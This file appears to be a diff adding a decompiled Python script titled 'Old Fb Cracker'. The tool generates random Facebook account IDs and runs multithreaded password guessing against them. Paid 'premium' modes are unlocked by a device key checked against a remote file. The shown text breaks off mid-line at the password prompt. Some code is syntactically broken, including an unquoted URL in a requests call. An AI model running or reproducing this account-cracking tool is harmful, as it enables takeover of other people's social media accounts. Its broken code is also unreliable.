@@ -1,0 +1,188 @@
+# Decompile by : Hamid Meer'hamii
+# Time Succes decompile : 2022-03-07 00:21:42.178972 
+
+W = '\033[97;1m' 
+R = '\033[91;1m' 
+G = '\033[92;1m' 
+Y = '\033[93;1m' 
+B = '\033[94;1m'
+P = '\033[95;1m'
+C = '\033[96;1m'
+N = '\x1b[0m'
+
+
+
+import os
+try:
+	import requests
+except ImportError:
+	os.system("pip install requests")
+
+try:
+	import concurrent.futures
+except ImportError:
+	os.system("pip install futures")
+
+import os
+import sys
+import time
+import requests
+import random
+import platform
+import base64
+import subprocess
+from concurrent.futures import ThreadPoolExecutor
+
+
+def runtxt(z):
+    for e in z + "\n":
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(0.03)
+
+
+
+def helpnote():
+	print("%s [*] FOLLOW ME ON Fb TU KNOW ABOUT UPDATES  :)"%(G))
+	subprocess.check_output(["am", "start", "https://m.me/H4CK3R.H4M11"])
+	exit(" [*] FACEBOOK :  https://www.facebook.com/H4CK3R.H4M11")
+
+
+def notice():
+
+ 
+
+	runtxt("\n\033[0;91m YOU ARE NOT PREMIUM USER ")
+	runtxt("\033[0;93m SEND THIS KEY TO ADMIN >> %s%s"%(G,basesplit))
+	runtxt("\033[0;92m ADMIN WHATSAPP >> +8801788953189")
+	subprocess.check_output(["am", "start", "https://wa.me/+8801788953189"])
+
+
+        
+plist = (platform.uname())[2]
+basex = plist
+basex1 = basex.encode('ascii')
+basex2 = base64.b64encode(basex1)
+basex3 = basex2.decode('ascii')
+base4 = (basex3).upper()
+basesplit = base4.replace('=', 'X').replace('A', '3').replace('B', '9').replace('C', '7').replace('D', '1').replace('E', '4').replace('M', '2').replace('L', '6').replace('F', '8').replace('N', 'E').replace('T', '8')
+
+
+class Main:
+	def __init__(self):
+		self.id = []
+		self.ok = []
+		self.cp = []
+		self.loop = 0
+		try:
+			plr = requests.get(https://github.com/sohel789/SOHEL-approval.txt/edit/main/README.mdtext
+			if basesplit in plr:
+				key = basesplit
+				stat = ("\033[0;92mPREMIUM")
+				FY = '\033[0;93m'
+				FG = '\033[0;92m'
+				GET = '\r'
+			else:
+				key = ("\033[0;91m -")
+				stat = ("\033[0;91mFREE USER")
+				FY = '\033[0;90m'
+				FG = '\033[0;90m'
+				GET = '\033[0;92m [P] GET PREMIUM'
+		except requests.exceptions.ConnectionError:
+			print("\n%s [!] NO INTERNET CONNECTION..\n"%(R))
+			exit()
+		os.system("clear")
+		
+		print ("""\033[0;92m
+\033[0;91m$$$$$$$\   $$$$$$\  $$\   $$\ $$$$$$\ $$$$$$$\  
+$$  __$$\ $$  __$$\ $$ | $$  |\_$$  _|$$  __$$\ 
+$$ |  $$ |$$ /  $$ |$$ |$$  /   $$ |  $$ |  $$ |
+$$$$$$$  |$$$$$$$$ |$$$$$  /    $$ |  $$$$$$$\ |
+$$  __$$< $$  __$$ |$$  $$<     $$ |  $$  __$$\ 
+$$ |  $$ |$$ |  $$ |$$ |\$$\    $$ |  $$ |  $$ |
+$$ |  $$ |$$ |  $$ |$$ | \$$\ $$$$$$\ $$$$$$$  |
+\__|  \__|\__|  \__|\__|  \__|\______|\_______/ 
+                                                
+                                                
+\033[0;92m
+\033[0;93m
+\033[0;94m
+\033[0;95m
+\033[0;96m
+
+ > \033[0;92mDEVELOPER     : Rakib
+ > \033[0;95mFACEBOOK ID   : MD Rakib
+ > \033[0;41mWHATSAPP      : 01707031806
+ \033[0;96m> YOUTUBE       : RKIB707
+ > \033[0;97mWARNING       : DONT USE FOR ILLEGAL WORK     
+    """)
+		print("%s [%s•%s] %sTOOL NAME : %sOld Fb Cracker"%(G,R,G,B,G))
+		print("%s [%s•%s] %sVERSION   : %s1.0"%(G,R,G,B,G))
+		print("%s [%s•%s] %sYOUR KEY  : %s%s"%(G,R,G,B,G,key))
+		print("%s [%s•%s] %sSTATUS    : %s"%(G,R,G,B,stat)) 
+		print("")
+		print("%s [%s1%s]%s CRACK RANDOM FB ID 2008-11 %s(FREE)"%(G,R,G,Y,B))
+		print("%s [%s2%s]%s CRACK RANDOM FB ID 2004-5 %s(PRO) V1"%(G,R,G,Y,G))
+		print("%s [%s3%s]%s CRACK RANDOM FB ID 2004-5 %s(PRO) V2"%(G,R,G,Y,G))
+		print("%s [%s4%s]%s CRACK RANDOM FB ID 2004 %s(PRO) V3"%(G,R,G,Y,G))
+		print("%s [%s5%s]%s CRACK FROM EMAILS %s(PRO)"%(G,R,G,Y,G))
+		print("%s [%s6%s]%s CRACK RANDOM FB ID Custom %s(PRO) V1"%(G,R,G,Y,G))
+		print(GET)
+		hoga = input("\n%s [?] CHOICE : "%(B))
+		if hoga in ["", " "]:
+			Main()
+		elif hoga in ["1", "01"]:
+			self.fbtua()
+		elif hoga in ["2", "02"]:
+			if basesplit in plr:
+				self.old4_7()
+			else: 
+				notice()
+				exit()
+		elif hoga in ["3", "03"]:
+			if basesplit in plr:
+				self.old4_6()
+			else: 
+				notice()
+				exit()
+		elif hoga in ["4", "04"]:
+			if basesplit in plr:
+				self.old4_5()
+			else: 
+				notice()
+				exit()
+		elif hoga in ["5", "05"]:
+			if basesplit in plr:
+				self.email()
+			else: 
+				notice()
+				exit()
+		elif hoga in ["6","06"]:
+			if basesplit in plr:
+				self.oldcrack()
+			else:
+				notice()
+				exit()
+		elif hoga in ["P", "p"]:
+			notice()
+			exit()
+		else:
+			Main()
+
+	def fbtua(self):
+		x = 111111111
+		xx = 999999999
+		idx = "100000"
+		limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(5000 MAX): \033[0;92m"))
+		if (limit)>5000:
+			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))
+		try:
+			for n in range(limit):
+				_ = random.randint(x,xx)
+				__ = idx
+				self.id.append(__+str(_))
+			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
+			with ThreadPoolExecutor(max_workers=30) as coeg:
+				print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(Y,G,B,Y))
+				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G))
+				listpass = input("%s [?] ENTER PASSWORD :%s "%(
